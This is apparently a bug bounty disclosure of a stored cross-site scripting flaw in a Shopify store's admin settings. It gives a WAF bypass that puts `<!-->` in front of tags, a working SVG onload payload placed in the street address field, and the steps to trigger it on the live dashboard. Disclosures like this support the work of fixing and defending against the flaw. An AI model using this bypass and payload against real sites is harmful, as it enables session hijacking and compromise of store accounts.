## 0x01 Cross-site Scripting (XSS) - Stored

Bounty	$1,000  
Severity	High (7 ~ 8.9)  

## 0x02 Analysis

绕过WAF：WAF cut html tages but put `<!-->` before tages can bypass  

1. Open your store account  
2. https://xxx.myshopify.com/admin/settings/general  
3. street address xss payload `xss"><!--><svg/onload=alert(document.domain)>)`  
4. https://xxx.myshopify.com/admin/dashboards/live, XSS alert message  

